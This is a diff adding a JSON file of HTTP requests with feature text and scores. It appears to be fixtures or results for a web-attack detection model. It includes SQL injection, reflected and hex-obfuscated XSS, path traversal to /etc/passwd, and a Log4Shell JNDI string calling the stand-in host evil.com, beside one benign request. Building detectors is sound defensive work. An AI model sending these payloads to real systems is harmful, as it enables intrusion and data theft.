@@ -1,0 +1,66 @@
+[
+  {
+    "method": "GET",
+    "path": "/items",
+    "query": "q=1 union select name from t",
+    "body": "",
+    "feature_text": "get /items q=1 union select name from t  get /items q=1 union select name from t ",
+    "score": 0.02870373962154407
+  },
+  {
+    "method": "GET",
+    "path": "/search",
+    "query": "name=<script>alert(1)</script>",
+    "body": "",
+    "feature_text": "get /search name=<script>alert(1)</script>  get /search name=<script>alert(1)</script> ",
+    "score": 0.025776837261565575
+  },
+  {
+    "method": "GET",
+    "path": "/a",
+    "query": "x=%2e%2e%2f%2e%2e%2fetc/passwd",
+    "body": "",
+    "feature_text": "get /a x=%2e%2e%2f%2e%2e%2fetc/passwd  get /a x=../../etc/passwd ",
+    "score": 0.999912634413238
+  },
+  {
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "user=admin&pass=1' or '1'='1",
+    "feature_text": "post /login  user=admin&pass=1' or '1'='1 post /login  user=admin&pass=1' or '1'='1",
+    "score": 0.9870001744714256
+  },
+  {
+    "method": "GET",
+    "path": "/p",
+    "query": "id=42&sort=price",
+    "body": "",
+    "feature_text": "get /p id=42&sort=price  get /p id=42&sort=price ",
+    "score": 1.6085625182901547e-06
+  },
+  {
+    "method": "GET",
+    "path": "/vulnerabilities/xss_r/",
+    "query": "name=parent[%27%5cx65%5cx76%5cx61%5cx6c%27]",
+    "body": "",
+    "feature_text": "get /vulnerabilities/xss_r/ name=parent[%27%5cx65%5cx76%5cx61%5cx6c%27]  get /vulnerabilities/xss_r/ name=parent['\\x65\\x76\\x61\\x6c'] ",
+    "score": 0.9999999486513356
+  },
+  {
+    "method": "GET",
+    "path": "/ref",
+    "query": "q=union+select+关键字",
+    "body": "",
+    "feature_text": "get /ref q=union+select+关键字  get /ref q=union select 关键字 ",
+    "score": 0.03745400919887296
+  },
+  {
+    "method": "GET",
+    "path": "/",
+    "query": "x=${jndi:ldap://evil.com/a}",
+    "body": "",
+    "feature_text": "get / x=${jndi:ldap://evil.com/a}  get / x=${jndi:ldap://evil.com/a} ",
+    "score": 0.059235592442663944
+  }
+]
